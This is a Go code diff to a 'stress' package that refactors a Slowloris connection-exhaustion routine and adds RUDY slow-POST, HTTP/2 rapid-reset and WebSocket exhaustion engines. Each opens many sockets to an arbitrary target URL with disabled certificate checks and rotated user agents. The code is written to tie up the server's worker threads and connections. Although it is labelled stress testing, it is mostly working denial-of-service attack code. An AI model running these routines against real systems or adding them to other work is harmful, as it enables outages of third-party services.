@@ -2,6 +2,7 @@ package stress
 
 import (
 	"crypto/tls"
+	"encoding/base64"
 	"fmt"
 	"math/rand"
 	"net"
@@ -100,20 +101,7 @@ func ExecuteSlowRateStress(targetURL string, concurrency int, durationSec int) {
 		targetURL = "http://" + targetURL
 	}
 
-	parsedTarget := strings.TrimPrefix(targetURL, "http://")
-	parsedTarget = strings.TrimPrefix(parsedTarget, "https://")
-	isTLS := strings.HasPrefix(targetURL, "https://")
-
-	port := "80"
-	if isTLS {
-		port = "443"
-	}
-	if strings.Contains(parsedTarget, ":") {
-		parts := strings.Split(parsedTarget, ":")
-		parsedTarget = parts[0]
-		port = parts[1]
-	}
-
+	parsedTarget, port, isTLS := parseTargetDetails(targetURL)
 	fmt.Printf("[!] ENGAGING SLOW-RATE EXHAUSTION (SLOWLORIS): %s:%s (Sockets: %d)\n", parsedTarget, port, concurrency)
 
 	sigChan := make(chan os.Signal, 1)
@@ -123,16 +111,7 @@ func ExecuteSlowRateStress(targetURL string, concurrency int, durationSec int) {
 		go func() {
 			rng := rand.New(rand.NewSource(time.Now().UnixNano()))
 			for {
-				var conn net.Conn
-				var err error
-				address := fmt.Sprintf("%s:%s", parsedTarget, port)
-
-				if isTLS {
-					conn, err = tls.DialWithDialer(&net.Dialer{Timeout: 3 * time.Second}, "tcp", address, &tls.Config{InsecureSkipVerify: true})
-				} else {
-					conn, err = net.DialTimeout("tcp", address, 3*time.Second)
-				}
-
+				conn, err := dialTarget(parsedTarget, port, isTLS)
 				if err != nil {
 					time.Sleep(2 * time.Second)
 					continue
@@ -205,7 +184,7 @@ func ExecuteWrkBenchmark(targetURL string, concurrency int, durationSec int) {
 	}
 
 	if durationSec <= 0 {
-		durationSec = 10 // Default benchmark window if not specified
+		durationSec = 10
 	}
 
 	fmt.Printf("[!] ENGAGING WRK-STYLE BENCHMARKING ENGINE: %s (Concurrency: %d, Window: %ds)\n", targetURL, concurrency, durationSec)
@@ -215,7 +194,6 @@ func ExecuteWrkBenchmark(targetURL string, concurrency int, durationSec int) {
 
 	var successCount uint64
 	var failCount uint64
-	var totalBytesRead uint64
 
 	tr := &http.Transport{
 		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
@@ -228,10 +206,8 @@ func ExecuteWrkBenchmark(targetURL string, concurrency int, durationSec int) {
 	}
 
 	stopChan := make(chan struct{})
-
 	startTime := time.Now()
 
-	// Spawn persistent benchmarking workers
 	for i := 0; i < concurrency; i++ {
 		go func() {
 			for {
@@ -251,7 +227,6 @@ func ExecuteWrkBenchmark(targetURL string, concurrency int, durationSec int) {
 		}()
 	}
 
-	// Timer ticker to display live metrics
 	ticker := time.NewTicker(1 * time.Second)
 	timer := time.NewTimer(time.Duration(durationSec) * time.Second)
 
@@ -290,7 +265,197 @@ func ExecuteWrkBenchmark(targetURL string, concurrency int, durationSec int) {
 	fmt.Println("==============================================")
 }
 
-// Helper for managing test durations
+// ==========================================
+// 5. RUDY SLOW-POST EXHAUSTION ENGINE
+// ==========================================
+func ExecuteRudyStress(targetURL string, concurrency int, durationSec int) {
+	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
+		targetURL = "http://" + targetURL
+	}
+
+	parsedTarget, port, isTLS := parseTargetDetails(targetURL)
+	fmt.Printf("[!] ENGAGING RUDY SLOW-POST EXHAUSTION ENGINE: %s:%s (Sockets: %d)\n", parsedTarget, port, concurrency)
+
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
+
+	for i := 0; i < concurrency; i++ {
+		go func() {
+			rng := rand.New(rand.NewSource(time.Now().UnixNano()))
+			for {
+				conn, err := dialTarget(parsedTarget, port, isTLS)
+				if err != nil {
+					time.Sleep(2 * time.Second)
+					continue
+				}
+
+				ua := userAgents[rng.Intn(len(userAgents))]
+				postHeader := fmt.Sprintf("POST /?%s=%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 1000000\r\nConnection: keep-alive\r\n\r\n",
+					randomString(4), randomString(5), parsedTarget, ua)
+
+				_, err = conn.Write([]byte(postHeader))
+				if err != nil {
+					conn.Close()
+					continue
+				}
+
+				// Slow drip POST body bytes one by one every 5 seconds to lock worker threads
+				for {
+					time.Sleep(5 * time.Second)
+					_, err = conn.Write([]byte("A"))
+					if err != nil {
+						conn.Close()
+						break
+					}
+				}
+			}
+		}()
+	}
+
+	handleDuration(durationSec, sigChan, "RUDY slow-post exhaustion test")
+}
+
+// ==========================================
+// 6. HTTP/2 RAPID RESET & STREAM MULTIPLEXING
+// ==========================================
+func ExecuteH2RapidResetStress(targetURL string, concurrency int, durationSec int) {
+	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
+		targetURL = "http://" + targetURL
+	}
+
+	fmt.Printf("[!] ENGAGING HTTP/2 RAPID RESET & STREAM ENGINE: %s (Concurrency: %d)\n", targetURL, concurrency)
+
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
+
+	tr := &http.Transport{
+		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
+		ForceAttemptHTTP2:   true,
+		MaxIdleConns:        concurrency * 2,
+		MaxIdleConnsPerHost: concurrency,
+	}
+	client := &http.Client{
+		Transport: tr,
+		Timeout:   3 * time.Second,
+	}
+
+	taskStream := make(chan struct{}, concurrency)
+
+	for i := 0; i < concurrency; i++ {
+		go func() {
+			for range taskStream {
+				req, err := http.NewRequest("GET", targetURL, nil)
+				if err != nil {
+					continue
+				}
+				req.Header.Set("Connection", "keep-alive")
+
+				// Perform request and instantly trigger teardown/cancellation to mimic RST_STREAM churn
+				resp, err := client.Do(req)
+				if err == nil {
+					resp.Body.Close()
+				}
+			}
+		}()
+	}
+
+	go func() {
+		for {
+			taskStream <- struct{}{}
+		}
+	}()
+
+	handleDuration(durationSec, sigChan, "HTTP/2 rapid reset stress test")
+}
+
+// ==========================================
+// 7. WEBSOCKET CONNECTION & FRAME EXHAUSTION
+// ==========================================
+func ExecuteWebSocketStress(targetURL string, concurrency int, durationSec int) {
+	if strings.HasPrefix(targetURL, "http://") {
+		targetURL = "ws://" + strings.TrimPrefix(targetURL, "http://")
+	} else if strings.HasPrefix(targetURL, "https://") {
+		targetURL = "wss://" + strings.TrimPrefix(targetURL, "https://")
+	}
+	if !strings.HasPrefix(targetURL, "ws://") && !strings.HasPrefix(targetURL, "wss://") {
+		targetURL = "ws://" + targetURL
+	}
+
+	parsedTarget, port, isTLS := parseTargetDetails(strings.Replace(strings.Replace(targetURL, "ws://", "http://", 1), "wss://", "https://", 1))
+
+	fmt.Printf("[!] ENGAGING WEBSOCKET POOL & FRAME EXHAUSTION: %s:%s (Sockets: %d)\n", parsedTarget, port, concurrency)
+
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
+
+	for i := 0; i < concurrency; i++ {
+		go func() {
+			for {
+				conn, err := dialTarget(parsedTarget, port, isTLS)
+				if err != nil {
+					time.Sleep(2 * time.Second)
+					continue
+				}
+
+				// Generate Sec-WebSocket-Key for handshake
+				keyBytes := make([]byte, 16)
+				rand.Read(keyBytes)
+				wsKey := base64.StdEncoding.EncodeToString(keyBytes)
+
+				upgradeReq := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n",
+					parsedTarget, wsKey)
+
+				_, err = conn.Write([]byte(upgradeReq))
+				if err != nil {
+					conn.Close()
+					continue
+				}
+
+				// Keep socket open and flood periodic ping/text data frames
+				for {
+					time.Sleep(8 * time.Second)
+					// Standard WebSocket ping frame opcode 0x9
+					_, err = conn.Write([]byte{0x89, 0x00})
+					if err != nil {
+						conn.Close()
+						break
+					}
+				}
+			}
+		}()
+	}
+
+	handleDuration(durationSec, sigChan, "WebSocket exhaustion test")
+}
+
+// ==========================================
+// HELPER UTILITIES
+// ==========================================
+func parseTargetDetails(targetURL string) (string, string, bool) {
+	parsedTarget := strings.TrimPrefix(targetURL, "http://")
+	parsedTarget = strings.TrimPrefix(parsedTarget, "https://")
+	isTLS := strings.HasPrefix(targetURL, "https://")
+
+	port := "80"
+	if isTLS {
+		port = "443"
+	}
+	if strings.Contains(parsedTarget, ":") {
+		parts := strings.Split(parsedTarget, ":")
+		parsedTarget = parts[0]
+		port = parts[1]
+	}
+	return parsedTarget, port, isTLS
+}
+
+func dialTarget(parsedTarget, port string, isTLS bool) (net.Conn, error) {
+	address := fmt.Sprintf("%s:%s", parsedTarget, port)
+	if isTLS {
+		return tls.DialWithDialer(&net.Dialer{Timeout: 3 * time.Second}, "tcp", address, &tls.Config{InsecureSkipVerify: true})
+	}
+	return net.DialTimeout("tcp", address, 3*time.Second)
+}
+
 func handleDuration(durationSec int, sigChan chan os.Signal, testName string) {
 	if durationSec > 0 {
 		timer := time.NewTimer(time.Duration(durationSec) * time.Second)
